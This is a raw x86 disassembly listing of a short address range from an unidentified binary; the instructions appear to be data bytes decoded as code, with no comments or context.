  404657:	add    al,bl
  404659:	add    DWORD PTR [edx],ebx
  40465b:	add    BYTE PTR [ecx],al
  40465d:	add    al,dh
  40465f:	and    al,BYTE PTR [eax]
  404661:	add    BYTE PTR [eax],al
  404663:	add    BYTE PTR [ecx+0x2001dd00],dl
  404669:	add    BYTE PTR [edx],al
  40466b:	add    BYTE PTR [eax+0x23],al
  40466e:	add    BYTE PTR [eax],al
  404670:	add    BYTE PTR [eax],al
  404672:	xchg   ecx,eax
  404673:	add    al,dh
  404675:	add    DWORD PTR [esi],esp
  404677:	add    BYTE PTR [ebx],al
  404679:	add    BYTE PTR [eax+0x25],ah
  40467c:	add    BYTE PTR [eax],al
  40467e:	add    BYTE PTR [eax],al
  404680:	xchg   ecx,eax
  404681:	add    BYTE PTR [eax],dh
  404683:	add    ch,BYTE PTR [eax+eax*1]
  404686:	add    al,0x0
  404688:	int3   
  404689:	and    eax,0x0
  40468e:	xchg   ecx,eax
  40468f:	add    BYTE PTR [ebx+0x2],dl
  404692:	add    BYTE PTR ss:[esi],al
  404695:	add    BYTE PTR [eax],al
  404697:	add    BYTE PTR [eax],al
  404699:	add    BYTE PTR [eax],al
  40469b:	add    dh,al
  40469d:	add    eax,0x3a0263
  4046a2:	push   es
  4046a3:	add    BYTE PTR [eax],cl
  4046a5:	add    BYTE PTR es:[eax],al
  4046a8:	add    BYTE PTR [eax],al
  4046aa:	out    0x1,al
  4046ac:	arpl   WORD PTR [edx],ax
  4046ae:	cmp    al,BYTE PTR [eax]
  4046b0:	pop    es
  4046b1:	add    BYTE PTR [edi+eiz*1],dh
  4046b4:	add    BYTE PTR [eax],al
  4046b6:	add    BYTE PTR [eax],al
  4046b8:	xchg   BYTE PTR [eax],bl
  4046ba:	imul   eax,DWORD PTR [edx],0x41
  4046bd:	add    BYTE PTR [eax],cl
  4046bf:	add    BYTE PTR [edi+eiz*1],bh
  4046c2:	add    BYTE PTR [eax],al
  4046c4:	add    BYTE PTR [eax],al
  4046c6:	out    0x1,al
  4046c8:	arpl   WORD PTR [edx],ax
  4046ca:	cmp    al,BYTE PTR [eax]
  4046cc:	or     BYTE PTR [eax],al
  4046ce:	sub    BYTE PTR [eax],ch
  4046d0:	add    BYTE PTR [eax],al
  4046d2:	add    BYTE PTR [eax],al
  4046d4:	xchg   BYTE PTR [eax],bl
  4046d6:	imul   eax,DWORD PTR [edx],0x41
  4046d9:	add    BYTE PTR [ecx],cl
  4046db:	add    BYTE PTR [eax],dh
  4046dd:	sub    BYTE PTR [eax],al
  4046df:	add    BYTE PTR [eax],al
  4046e1:	add    dh,ah
  4046e3:	add    DWORD PTR [ebx+0x2],esp
  4046e6:	cmp    al,BYTE PTR [eax]
  4046e8:	or     DWORD PTR [eax],eax
  4046ea:	sbb    BYTE PTR [ecx],ch
  4046ec:	add    BYTE PTR [eax],al
  4046ee:	add    BYTE PTR [eax],al
  4046f0:	xchg   BYTE PTR [eax],bl
  4046f2:	imul   eax,DWORD PTR [edx],0x41
  4046f5:	add    BYTE PTR [edx],cl
  4046f7:	add    BYTE PTR [eax],ah
  4046f9:	sub    DWORD PTR [eax],eax
  4046fb:	add    BYTE PTR [eax],al
  4046fd:	add    dh,ah
  4046ff:	add    DWORD PTR [ebx+0x2],esp
  404702:	cmp    al,BYTE PTR [eax]
  404704:	or     al,BYTE PTR [eax]
  404706:	jl     0x404731
  404708:	add    BYTE PTR [eax],al
  40470a:	add    BYTE PTR [eax],al
  40470c:	xchg   ecx,eax
  40470d:	add    BYTE PTR [edx+0xb004502],al
  404713:	add    al,bl
  404715:	sub    DWORD PTR [eax],eax
  404717:	add    BYTE PTR [eax],al
  404719:	add    BYTE PTR [esi+0x41026b18],al
  40471f:	add    BYTE PTR [eax+eax*1],cl
  404722:	sub    al,BYTE PTR fs:[eax]
  404725:	add    BYTE PTR [eax],al
  404727:	add    dh,ah
  404729:	add    DWORD PTR [ebx+0x2],esp
  40472c:	cmp    al,BYTE PTR [eax]
  40472e:	or     al,0x0
  404730:	mov    WORD PTR ds:0x0,gs
  404736:	xchg   ecx,eax
  404737:	add    BYTE PTR [edx+0xd004c02],ch
  40473d:	add    BYTE PTR [eax+0x2e],al
  404743:	add    BYTE PTR [ecx+0x4c02bc00],dl
  404749:	add    BYTE PTR [esi],cl
  40474b:	add    BYTE PTR [eax],dh
  40474d:	das    
  40474e:	add    BYTE PTR [eax],al
  404750:	add    BYTE PTR [eax],al
  404752:	xchg   ecx,eax
  404753:	add    dh,cl
  404755:	add    dl,BYTE PTR [edx+0x0]
  404758:	sldt   eax
  40475b:	das    
  40475c:	add    BYTE PTR [eax],al
  40475e:	add    BYTE PTR [eax],al
  404760:	xchg   BYTE PTR [eax],bl
  404762:	imul   eax,DWORD PTR [edx],0x41
  404765:	add    BYTE PTR [eax],dl
  404767:	add    BYTE PTR [ebp+ebp*1+0x0],ch
  40476b:	add    BYTE PTR [eax],al
  40476d:	add    BYTE PTR [ecx+0x1c250400],dl
  404773:	add    eax,0x2d740010
  404778:	add    BYTE PTR [eax],al
  40477a:	add    BYTE PTR [eax],al
  40477c:	xchg   ecx,eax
  40477d:	add    BYTE PTR [edx+0x25],ch
  404780:	cs add eax,0x2e780011
  404786:	add    BYTE PTR [eax],al
  404788:	add    BYTE PTR [eax],al
  40478a:	xchg   ecx,eax
  40478b:	add    dh,dh
  40478d:	es sbb al,0x5
  404790:	adc    al,BYTE PTR [eax]
  404792:	enter  0x2f,0x0
  404796:	add    BYTE PTR [eax],al
  404798:	xchg   BYTE PTR [eax],bl
  40479a:	imul   eax,DWORD PTR [edx],0x41
  40479d:	add    BYTE PTR [ebx],dl
  40479f:	add    BYTE PTR [eax],bh
  4047a1:	xor    BYTE PTR [eax],al
  4047a3:	add    BYTE PTR [eax],al
  4047a5:	add    dh,ah
  4047a7:	add    DWORD PTR [ebx],esi
  4047a9:	add    ebp,DWORD PTR [eax+eax*1+0x13]
  4047ad:	add    BYTE PTR [eax+0x30],dh
  4047b3:	add    BYTE PTR [esi-0x6afd94e8],al
  4047b9:	add    BYTE PTR [eax+eax*1],dl
  4047bc:	adc    DWORD PTR [ecx],esi
  4047be:	add    BYTE PTR [eax],al
  4047c0:	add    BYTE PTR [eax],al
  4047c2:	xchg   BYTE PTR [eax],cl
  4047c4:	mov    ebp,0x15009b03
  4047c9:	add    BYTE PTR [ecx],bl
  4047cb:	xor    DWORD PTR [eax],eax
  4047cd:	add    BYTE PTR [eax],al
  4047cf:	add    BYTE PTR [ecx-0x5ffc36f8],al
  4047d5:	add    BYTE PTR ds:0x312200,dl
  4047db:	add    BYTE PTR [eax],al
  4047dd:	add    BYTE PTR [esi-0x59fc2af8],al
  4047e3:	add    BYTE PTR [esi],dl
  4047e5:	add    BYTE PTR [edx],ch
  4047e7:	xor    DWORD PTR [eax],eax
  4047e9:	add    BYTE PTR [eax],al
  4047eb:	add    BYTE PTR [ecx-0x54fc0cf8],al
  4047f1:	add    BYTE PTR [esi],dl
  4047f3:	add    BYTE PTR [ebx],dh
  4047f5:	xor    DWORD PTR [eax],eax
  4047f7:	add    BYTE PTR [eax],al
  4047f9:	add    BYTE PTR [esi-0x4efbdcf8],al
  4047ff:	add    BYTE PTR [edi],dl
  404801:	add    BYTE PTR [ebx],bh
  404803:	xor    DWORD PTR [eax],eax
  404805:	add    BYTE PTR [eax],al
  404807:	add    BYTE PTR [ecx-0x49fbc3f8],al
  40480d:	add    BYTE PTR [edi],dl
  40480f:	add    BYTE PTR [ecx+esi*1+0x0],al
  404813:	add    BYTE PTR [eax],al
  404815:	add    BYTE PTR [esi-0x43fbaaf8],al
  40481b:	add    BYTE PTR [eax],bl
  40481d:	add    BYTE PTR [ecx+esi*1+0x0],cl
  404821:	add    BYTE PTR [eax],al
  404823:	add    BYTE PTR [ecx-0x3ffb97f8],al
  404829:	add    BYTE PTR [eax],bl
  40482b:	add    BYTE PTR [ebp+0x31],dl
  40482e:	add    BYTE PTR [eax],al
  404830:	add    BYTE PTR [eax],al
  404832:	xchg   BYTE PTR [eax],cl
  404834:	jnp    0x40483a
  404836:	mov    esp,0x5d001900
  40483b:	xor    DWORD PTR [eax],eax
  40483d:	add    BYTE PTR [eax],al
  40483f:	add    BYTE PTR [ecx-0x3ffb70f8],al
  404845:	add    BYTE PTR [ecx],bl
  404847:	add    BYTE PTR [esi+0x31],ah
  40484a:	add    BYTE PTR [eax],al
  40484c:	add    BYTE PTR [eax],al
  40484e:	xchg   BYTE PTR [eax],cl
  404850:	mov    ds:0x1a00bc04,eax
  404855:	add    BYTE PTR [esi+0x31],ch
  404858:	add    BYTE PTR [eax],al
  40485a:	add    BYTE PTR [eax],al
  40485c:	or     DWORD PTR [eax],0xc004b7
  404862:	sbb    al,BYTE PTR [eax]
  404864:	ja     0x404897
  404866:	add    BYTE PTR [eax],al
  404868:	add    BYTE PTR [eax],al
  40486a:	xchg   BYTE PTR [eax],cl
  40486c:	retf   
  40486d:	add    al,0xbc
  40486f:	add    BYTE PTR [ebx],bl
  404871:	add    BYTE PTR [edi+0x31],bh
  404874:	add    BYTE PTR [eax],al
  404876:	add    BYTE PTR [eax],al
  404878:	or     DWORD PTR [eax],0xc004df
  40487e:	sbb    eax,DWORD PTR [eax]
  404880:	mov    BYTE PTR [ecx],dh
  404882:	add    BYTE PTR [eax],al
  404884:	add    BYTE PTR [eax],al
  404886:	xchg   BYTE PTR [eax],cl
  404888:	repz add al,0xbc
  40488b:	add    BYTE PTR [eax+eax*1],bl
  40488e:	nop
  40488f:	xor    DWORD PTR [eax],eax
  404891:	add    BYTE PTR [eax],al
  404893:	add    BYTE PTR [ecx-0x3ffaf7f8],al
  404899:	add    BYTE PTR [eax+eax*1],bl
  40489c:	cdq    
  40489d:	xor    DWORD PTR [eax],eax
  40489f:	add    BYTE PTR [eax],al
  4048a1:	add    BYTE PTR [esi-0x3afae2f8],al
  4048a7:	add    BYTE PTR ds:0x31a100,bl
  4048ad:	add    BYTE PTR [eax],al
  4048af:	add    BYTE PTR [ecx-0x36fad4f8],al
  4048b5:	add    BYTE PTR ds:0x31aa00,bl
  4048bb:	add    BYTE PTR [eax],al
  4048bd:	add    BYTE PTR [esi-0x3afac6f8],al
  4048c3:	add    BYTE PTR [esi],bl
  4048c5:	add    BYTE PTR [edx+0x31],dh
  4048cb:	add    BYTE PTR [ecx-0x36fab7f8],al
  4048d1:	add    BYTE PTR [esi],bl
  4048d3:	add    BYTE PTR [ebx+0x31],bh
  4048d9:	add    BYTE PTR [esi-0x31faa8f8],al
  4048df:	add    BYTE PTR [edi],bl
  4048e1:	add    bl,al
  4048e3:	xor    DWORD PTR [eax],eax
  4048e5:	add    BYTE PTR [eax],al
  4048e7:	add    BYTE PTR [ecx-0x2cfa99f8],al
  4048ed:	add    BYTE PTR [edi],bl
  4048ef:	add    ah,cl
  4048f1:	xor    DWORD PTR [eax],eax
  4048f3:	add    BYTE PTR [eax],al
  4048f5:	add    BYTE PTR [esi-0x3afa8af8],al
  4048fb:	add    BYTE PTR [eax],ah
  4048fd:	add    ah,dl
  4048ff:	xor    DWORD PTR [eax],eax
  404901:	add    BYTE PTR [eax],al
  404903:	add    BYTE PTR [ecx-0x36fa75f8],al
  404909:	add    BYTE PTR [eax],ah
  40490b:	add    ch,bl
  40490d:	xor    DWORD PTR [eax],eax
  40490f:	add    BYTE PTR [eax],al
  404911:	add    BYTE PTR [esi-0x3afa60f8],al
  404917:	add    BYTE PTR [ecx],ah
  404919:	add    ch,ah
  40491b:	xor    DWORD PTR [eax],eax
  40491d:	add    BYTE PTR [eax],al
  40491f:	add    BYTE PTR [ecx-0x36fa4cf8],al
  404925:	add    BYTE PTR [ecx],ah
  404927:	add    dh,ch
  404929:	xor    DWORD PTR [eax],eax
  40492b:	add    BYTE PTR [eax],al
  40492d:	add    BYTE PTR [esi-0x26fa2cf8],al
  404933:	add    BYTE PTR [edx],ah
  404935:	add    dh,dh
  404937:	xor    DWORD PTR [eax],eax
  404939:	add    BYTE PTR [eax],al
  40493b:	add    BYTE PTR [ecx-0x21fa21f8],al
  404941:	add    BYTE PTR [edx],ah
  404943:	add    bh,bh
  404945:	xor    DWORD PTR [eax],eax
  404947:	add    BYTE PTR [eax],al
  404949:	add    BYTE PTR [esi-0x43fa16f8],al
  40494f:	add    BYTE PTR [ebx],ah
  404951:	add    BYTE PTR [edi],al
  404953:	xor    al,BYTE PTR [eax]
  404955:	add    BYTE PTR [eax],al
  404957:	add    BYTE PTR [ecx-0x3ff9fdf8],al
  40495d:	add    BYTE PTR [ebx],ah
  40495f:	add    BYTE PTR [eax],dl
  404961:	xor    al,BYTE PTR [eax]
  404963:	add    BYTE PTR [eax],al
  404965:	add    ah,al
  404967:	or     BYTE PTR [ebx],bl
  404969:	push   es
  40496a:	in     al,0x0
  40496c:	and    al,0x0
  40496e:	adc    al,0x32
  404970:	add    BYTE PTR [eax],al
  404972:	add    BYTE PTR [eax],al
  404974:	xchg   ebx,eax
  404975:	add    BYTE PTR [ebx],dh
  404977:	push   es
  404978:	call   0x74406d7d
  40497d:	xor    al,BYTE PTR [eax]
  40497f:	add    BYTE PTR [eax],al
  404981:	add    ah,al
  404983:	add    BYTE PTR [ebx+0x6],al
  404986:	inc    ecx
  404987:	add    BYTE PTR ds:0x348c00,ah
  40498d:	add    BYTE PTR [eax],al
  40498f:	add    BYTE PTR [ecx-0x12f9af00],dl
  404995:	add    BYTE PTR ds:0x34b700,ah
  40499b:	add    BYTE PTR [eax],al
  40499d:	add    BYTE PTR [ecx-0xdf99e00],dl
  4049a3:	add    BYTE PTR ds:0x34c800,ah
  4049a9:	add    BYTE PTR [eax],al
  4049ab:	add    BYTE PTR [ecx-0x6f98700],dl
  4049b1:	add    BYTE PTR [edi],ah
  4049b3:	add    BYTE PTR [eax],al
  4049b5:	xor    eax,0x0
  4049ba:	add    DWORD PTR [eax],0x1010691
  4049c0:	sub    DWORD PTR [eax],eax
  4049c2:	xor    BYTE PTR ds:0x0,dh
  4049c8:	add    DWORD PTR [eax],0x10906a0
  4049ce:	sub    eax,DWORD PTR [eax]
  4049d0:	nop
  4049d1:	xor    eax,0x0
  4049d6:	add    DWORD PTR [eax],0x9b06af
  4049dc:	sub    eax,0x361000
  4049e1:	add    BYTE PTR [eax],al
  4049e3:	add    BYTE PTR [ecx-0x59f93c00],al
  4049e9:	add    BYTE PTR ds:0x366800,ch
  4049ef:	add    BYTE PTR [eax],al
  4049f1:	add    BYTE PTR [ecx+0x1006e200],al
  4049f7:	add    DWORD PTR ds:0x36c300,ebp
  4049fd:	add    BYTE PTR [eax],al
  4049ff:	add    BYTE PTR [esi+0x78026b18],al
  404a05:	add    DWORD PTR ds:0x36e200,ebp
  404a0b:	add    BYTE PTR [eax],al
  404a0d:	add    BYTE PTR [esi-0x36fd94e8],al
  404a13:	add    BYTE PTR [esi],ch
  404a15:	add    ch,bh
  404a17:	add    BYTE PTR ss:[eax],al
  404a1a:	add    BYTE PTR [eax],al
  404a1c:	xchg   BYTE PTR [eax],cl
  404a1e:	jo     0x404a2b
  404a20:	jge    0x404a23
  404a22:	das    
  404a23:	add    BYTE PTR ds:0x37,al
  404a29:	add    BYTE PTR [esi-0x3af488f8],al
  404a2f:	add    BYTE PTR [edi],ch
  404a31:	add    BYTE PTR [eax],dl
  404a33:	aaa    
  404a34:	add    BYTE PTR [eax],al
  404a36:	add    BYTE PTR [eax],al
  404a38:	xchg   BYTE PTR [eax],al
  404a3a:	or     BYTE PTR [ebx],0xbc
  404a3d:	add    BYTE PTR [edi],ch
  404a3f:	add    BYTE PTR [eax+0x37],al
  404a42:	add    BYTE PTR [eax],al
  404a44:	add    BYTE PTR [eax],al
  404a46:	xchg   BYTE PTR [eax],al
  404a48:	mov    ds:0x2f01850b,eax
  404a4d:	add    dl,ch
  404a4f:	aaa    
  404a50:	add    BYTE PTR [eax],al
  404a52:	add    BYTE PTR [eax],al
  404a54:	xchg   BYTE PTR [eax],bl
  404a56:	imul   eax,DWORD PTR [edx],0x41
  404a59:	add    BYTE PTR [edi],ch
  404a5b:	add    al,bh
  404a5d:	aaa    
  404a5e:	add    BYTE PTR [eax],al
  404a60:	add    BYTE PTR [eax],al
  404a62:	xchg   BYTE PTR [eax],bl
  404a64:	imul   eax,DWORD PTR [edx],0xffffffc0
  404a67:	add    BYTE PTR [edi],ch
  404a69:	add    BYTE PTR [esi],al
  404a6b:	cmp    BYTE PTR [eax],al
  404a6d:	add    BYTE PTR [eax],al
  404a6f:	add    BYTE PTR [esi-0x6df431f8],al
  404a75:	add    DWORD PTR [eax],esi
  404a77:	add    BYTE PTR [esi],cl
  404a79:	cmp    BYTE PTR [eax],al
  404a7b:	add    BYTE PTR [eax],al
  404a7d:	add    BYTE PTR [ecx-0x68f426f8],al
  404a83:	add    DWORD PTR [eax],esi
  404a85:	add    BYTE PTR [edi],dl
  404a87:	cmp    BYTE PTR [eax],al
  404a89:	add    BYTE PTR [eax],al
  404a8b:	add    BYTE PTR [esi+0x410be400],al
  404a91:	add    BYTE PTR [ecx],dh
  404a93:	add    BYTE PTR [eax+0x38],al
  404a96:	add    BYTE PTR [eax],al
  404a98:	add    BYTE PTR [eax],al
  404a9a:	xchg   BYTE PTR [eax],al
  404a9c:	add    BYTE PTR [ecx+eax*2],cl
  404a9f:	add    BYTE PTR [ecx],dh
  404aa1:	add    BYTE PTR [eax+edi*1+0x0],ah
  404aa8:	xchg   BYTE PTR [eax],al
  404aaa:	sbb    cl,BYTE PTR [esp+edi*4]
  404aad:	add    BYTE PTR [ecx],dh
  404aaf:	add    ah,ah
  404ab1:	cmp    BYTE PTR [eax],al
  404ab3:	add    BYTE PTR [eax],al
  404ab5:	add    BYTE PTR [esi-0x62f3bf00],al
  404abb:	add    DWORD PTR [ecx],esi
  404abd:	add    BYTE PTR [edx+edi*1],ch
  404ac0:	add    BYTE PTR [eax],al
  404ac2:	add    BYTE PTR [eax],al
  404ac4:	add    DWORD PTR [eax],0x1a60c6e
  404aca:	xor    eax,DWORD PTR [eax]
  404acc:	cmp    al,BYTE PTR gs:[eax]
  404acf:	add    BYTE PTR [eax],al
  404ad1:	add    BYTE PTR [ebx+0x41026b18],al
  404ad7:	add    BYTE PTR [eax+eax*1],dh
  404ada:	jo     0x404b16
  404adc:	add    BYTE PTR [eax],al
  404ade:	add    BYTE PTR [eax],al
  404ae0:	xchg   ebx,eax
  404ae1:	or     BYTE PTR [eax],al
  404ae3:	or     eax,0x3401be
  404ae8:	scas   eax,DWORD PTR es:[edi]
  404ae9:	cmp    al,BYTE PTR [eax]
  404aeb:	add    BYTE PTR [eax],al
  404aed:	add    BYTE PTR [ebx-0x3cf2ebf8],dl
  404af3:	add    DWORD PTR [eax+eax*1],esi
  404af6:	mov    dh,0x3a
  404af8:	add    BYTE PTR [eax],al
  404afa:	add    BYTE PTR [eax],al
  404afc:	xchg   ebx,eax
  404afd:	or     BYTE PTR [eax],ah
  404aff:	or     eax,0x3401c8
  404b04:	mov    esi,0x3a
  404b09:	add    BYTE PTR [ebx+0x360d2c08],dl
  404b0f:	add    BYTE PTR ds:0x3ad400,dh
  404b15:	add    BYTE PTR [eax],al
  404b17:	add    BYTE PTR [ebx+0x360d5008],dl
  404b1d:	add    BYTE PTR ds:0x3aea00,dh
  404b23:	add    BYTE PTR [eax],al
  404b25:	add    BYTE PTR [ebx+0x360d6408],dl
  404b2b:	add    BYTE PTR ds:0x3b0000,dh
  404b31:	add    BYTE PTR [eax],al
  404b33:	add    BYTE PTR [ebx+0x360d8408],dl
  404b39:	add    BYTE PTR ds:0x3b1600,dh
  404b3f:	add    BYTE PTR [eax],al
  404b41:	add    BYTE PTR [ebx+0x360da608],dl
  404b47:	add    BYTE PTR ds:0x3b2c00,dh
  404b4d:	add    BYTE PTR [eax],al
  404b4f:	add    BYTE PTR [ebx+0x360dc308],dl
  404b55:	add    BYTE PTR ds:0x3b4200,dh
  404b5b:	add    BYTE PTR [eax],al
  404b5d:	add    BYTE PTR [ebx+0x360ded08],dl
  404b63:	add    BYTE PTR ds:0x3b5800,dh
  404b69:	add    BYTE PTR [eax],al
  404b6b:	add    BYTE PTR [ebx+0x360e1408],dl
  404b71:	add    BYTE PTR ds:0x3b6e00,dh
  404b77:	add    BYTE PTR [eax],al
  404b79:	add    BYTE PTR [ebx+0x360e2808],dl
  404b7f:	add    BYTE PTR ds:0x3b8400,dh
  404b85:	add    BYTE PTR [eax],al
  404b87:	add    BYTE PTR [ebx+0x360e4608],dl
  404b8d:	add    BYTE PTR ds:0x3b9a00,dh
  404b93:	add    BYTE PTR [eax],al
  404b95:	add    BYTE PTR [ebx+0x360e5808],dl
  404b9b:	add    BYTE PTR ds:0x3bb000,dh
  404ba1:	add    BYTE PTR [eax],al
  404ba3:	add    BYTE PTR [ebx+0x360e7308],dl
  404ba9:	add    BYTE PTR ds:0x3bc600,dh
  404baf:	add    BYTE PTR [eax],al
  404bb1:	add    BYTE PTR [ebx+0x360e8c08],dl
  404bb7:	add    BYTE PTR ds:0x3bdc00,dh
  404bbd:	add    BYTE PTR [eax],al
  404bbf:	add    BYTE PTR [ebx+0x360ea908],dl
  404bc5:	add    BYTE PTR ds:0x3bf200,dh
  404bcb:	add    BYTE PTR [eax],al
  404bcd:	add    BYTE PTR [ebx+0x360ebc08],dl
  404bd3:	add    BYTE PTR ds:0x3c0800,dh
  404bd9:	add    BYTE PTR [eax],al
  404bdb:	add    BYTE PTR [ebx+0x360ece08],dl
  404be1:	add    BYTE PTR ds:0x3c1e00,dh
  404be7:	add    BYTE PTR [eax],al
  404be9:	add    BYTE PTR [ebx+0x360ee008],dl
  404bef:	add    BYTE PTR ds:0x3c3400,dh
  404bf5:	add    BYTE PTR [eax],al
  404bf7:	add    BYTE PTR [ebx+0x360ef208],dl
  404bfd:	add    BYTE PTR ds:0x3c4a00,dh
  404c03:	add    BYTE PTR [eax],al
  404c05:	add    BYTE PTR [ebx+0x360f0408],dl
  404c0b:	add    BYTE PTR ds:0x3c6000,dh
  404c11:	add    BYTE PTR [eax],al
  404c13:	add    BYTE PTR [ebx+0x360f1a08],dl
  404c19:	add    BYTE PTR ds:0x3c7600,dh
  404c1f:	add    BYTE PTR [eax],al
  404c21:	add    BYTE PTR [ebx+0x360f2c08],dl
  404c27:	add    BYTE PTR ds:0x3c8c00,dh
  404c2d:	add    BYTE PTR [eax],al
  404c2f:	add    BYTE PTR [ebx+0x360f3f08],dl
  404c35:	add    BYTE PTR ds:0x3ca200,dh
  404c3b:	add    BYTE PTR [eax],al
  404c3d:	add    BYTE PTR [ebx+0x360f5008],dl
  404c43:	add    BYTE PTR ds:0x3cb800,dh
  404c49:	add    BYTE PTR [eax],al
  404c4b:	add    BYTE PTR [ebx+0x360f7208],dl
  404c51:	add    BYTE PTR ds:0x3cce00,dh
  404c57:	add    BYTE PTR [eax],al
  404c59:	add    BYTE PTR [ebx+0x360f8d08],dl
  404c5f:	add    BYTE PTR ds:0x3ce400,dh
  404c65:	add    BYTE PTR [eax],al
  404c67:	add    BYTE PTR [ebx+0x360fa508],dl
  404c6d:	add    BYTE PTR ds:0x3cfa00,dh
  404c73:	add    BYTE PTR [eax],al
  404c75:	add    BYTE PTR [ebx+0x360fbe08],dl
  404c7b:	add    BYTE PTR ds:0x3d1000,dh
  404c81:	add    BYTE PTR [eax],al
  404c83:	add    BYTE PTR [ebx+0x360fcd08],dl
  404c89:	add    BYTE PTR ds:0x3d2600,dh
  404c8f:	add    BYTE PTR [eax],al
  404c91:	add    BYTE PTR [ebx+0x360ff108],dl
  404c97:	add    BYTE PTR ds:0x3d3c00,dh
  404c9d:	add    BYTE PTR [eax],al
  404c9f:	add    BYTE PTR [ebx+0x36100808],dl
  404ca5:	add    BYTE PTR ds:0x3d5200,dh
  404cab:	add    BYTE PTR [eax],al
  404cad:	add    BYTE PTR [ebx+0x36102308],dl
  404cb3:	add    BYTE PTR ds:0x3d6800,dh
  404cb9:	add    BYTE PTR [eax],al
  404cbb:	add    BYTE PTR [ebx+0x36103c08],dl
  404cc1:	add    BYTE PTR ds:0x3d7e00,dh
  404cc7:	add    BYTE PTR [eax],al
  404cc9:	add    BYTE PTR [ebx+0x36105508],dl
  404ccf:	add    BYTE PTR ds:0x3d9400,dh
  404cd5:	add    BYTE PTR [eax],al
  404cd7:	add    BYTE PTR [ebx+0x36107308],dl
  404cdd:	add    BYTE PTR ds:0x3daa00,dh
  404ce3:	add    BYTE PTR [eax],al
  404ce5:	add    BYTE PTR [ebx+0x36108c08],dl
  404ceb:	add    BYTE PTR ds:0x3dc000,dh
  404cf1:	add    BYTE PTR [eax],al
  404cf3:	add    BYTE PTR [ebx+0x3610a808],dl
  404cf9:	add    BYTE PTR ds:0x3dd600,dh
  404cff:	add    BYTE PTR [eax],al
  404d01:	add    BYTE PTR [ebx+0x3610c408],dl
  404d07:	add    BYTE PTR ds:0x3dec00,dh
  404d0d:	add    BYTE PTR [eax],al
  404d0f:	add    BYTE PTR [ebx+0x3610df08],dl
  404d15:	add    BYTE PTR ds:0x3e0200,dh
  404d1b:	add    BYTE PTR [eax],al
  404d1d:	add    BYTE PTR [ebx+0x3610fa08],dl
  404d23:	add    BYTE PTR ds:0x3e1800,dh
  404d29:	add    BYTE PTR [eax],al
  404d2b:	add    BYTE PTR [ebx+0x36111508],dl
  404d31:	add    BYTE PTR ds:0x3e2e00,dh
  404d37:	add    BYTE PTR [eax],al
  404d39:	add    BYTE PTR [ebx+0x36113008],dl
  404d3f:	add    BYTE PTR ds:0x3e4400,dh
  404d45:	add    BYTE PTR [eax],al
  404d47:	add    BYTE PTR [ebx+0x36114f08],dl
  404d4d:	add    BYTE PTR ds:0x3e5a00,dh
  404d53:	add    BYTE PTR [eax],al
  404d55:	add    BYTE PTR [ebx+0x36116a08],dl
  404d5b:	add    BYTE PTR ds:0x3e7000,dh
  404d61:	add    BYTE PTR [eax],al
  404d63:	add    BYTE PTR [ebx+0x36118608],dl
  404d69:	add    BYTE PTR ds:0x3e8600,dh
  404d6f:	add    BYTE PTR [eax],al
  404d71:	add    BYTE PTR [ebx+0x3611a008],dl
  404d77:	add    BYTE PTR ds:0x3e9c00,dh
  404d7d:	add    BYTE PTR [eax],al
  404d7f:	add    BYTE PTR [ebx+0x3611ba08],dl
  404d85:	add    BYTE PTR ds:0x3eb200,dh
  404d8b:	add    BYTE PTR [eax],al
  404d8d:	add    BYTE PTR [ebx+0x3611d308],dl
  404d93:	add    BYTE PTR ds:0x3ec800,dh
  404d99:	add    BYTE PTR [eax],al
  404d9b:	add    BYTE PTR [ebx+0x3611ec08],dl
  404da1:	add    BYTE PTR ds:0x3ede00,dh
  404da7:	add    BYTE PTR [eax],al
  404da9:	add    BYTE PTR [ebx+0x36120908],dl
  404daf:	add    BYTE PTR ds:0x3ef400,dh
  404db5:	add    BYTE PTR [eax],al
  404db7:	add    BYTE PTR [ebx+0x36122208],dl
  404dbd:	add    BYTE PTR ds:0x3f0a00,dh
  404dc3:	add    BYTE PTR [eax],al
  404dc5:	add    BYTE PTR [ebx+0x36123c08],dl
  404dcb:	add    BYTE PTR ds:0x3f2000,dh
  404dd1:	add    BYTE PTR [eax],al
  404dd3:	add    BYTE PTR [ebx+0x36125608],dl
  404dd9:	add    BYTE PTR ds:0x3f3600,dh
  404ddf:	add    BYTE PTR [eax],al
  404de1:	add    BYTE PTR [ebx+0x36126b08],dl
  404de7:	add    BYTE PTR ds:0x3f4c00,dh
  404ded:	add    BYTE PTR [eax],al
  404def:	add    BYTE PTR [ebx+0x36128808],dl
  404df5:	add    BYTE PTR ds:0x3f6200,dh
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	add    BYTE PTR [ebx+0x3612a408],dl
  404e03:	add    BYTE PTR ds:0x3f7800,dh
  404e09:	add    BYTE PTR [eax],al
  404e0b:	add    BYTE PTR [ebx+0x3612c008],dl
  404e11:	add    BYTE PTR ds:0x3f8e00,dh
  404e17:	add    BYTE PTR [eax],al
  404e19:	add    BYTE PTR [ebx+0x3612d908],dl
  404e1f:	add    BYTE PTR ds:0x3fa400,dh
  404e25:	add    BYTE PTR [eax],al
  404e27:	add    BYTE PTR [ebx+0x3612f408],dl
  404e2d:	add    BYTE PTR ds:0x3fba00,dh
  404e33:	add    BYTE PTR [eax],al
  404e35:	add    BYTE PTR [ebx+0x36131208],dl
  404e3b:	add    BYTE PTR ds:0x3fd000,dh
  404e41:	add    BYTE PTR [eax],al
  404e43:	add    BYTE PTR [ebx+0x36133008],dl
  404e49:	add    BYTE PTR ds:0x3fe600,dh
  404e4f:	add    BYTE PTR [eax],al
  404e51:	add    BYTE PTR [ebx+0x36135b08],dl
  404e57:	add    BYTE PTR ds:0x3ffc00,dh
  404e5d:	add    BYTE PTR [eax],al
  404e5f:	add    BYTE PTR [ebx+0x36137808],dl
  404e65:	add    BYTE PTR ds:0x401200,dh
  404e6b:	add    BYTE PTR [eax],al
  404e6d:	add    BYTE PTR [ebx+0x36139408],dl
  404e73:	add    BYTE PTR ds:0x402800,dh
  404e79:	add    BYTE PTR [eax],al
  404e7b:	add    BYTE PTR [ebx+0x3613b408],dl
  404e81:	add    BYTE PTR ds:0x403e00,dh
  404e87:	add    BYTE PTR [eax],al
  404e89:	add    BYTE PTR [ebx+0x3613d308],dl
  404e8f:	add    BYTE PTR ds:0x405400,dh
  404e95:	add    BYTE PTR [eax],al
  404e97:	add    BYTE PTR [ebx+0x3613ed08],dl
  404e9d:	add    BYTE PTR ds:0x406a00,dh
  404ea3:	add    BYTE PTR [eax],al
  404ea5:	add    BYTE PTR [ebx+0x36140f08],dl
  404eab:	add    BYTE PTR ds:0x29e000,dh
  404eb1:	add    BYTE PTR [eax],al
  404eb3:	add    BYTE PTR [esi+0x41026b18],al
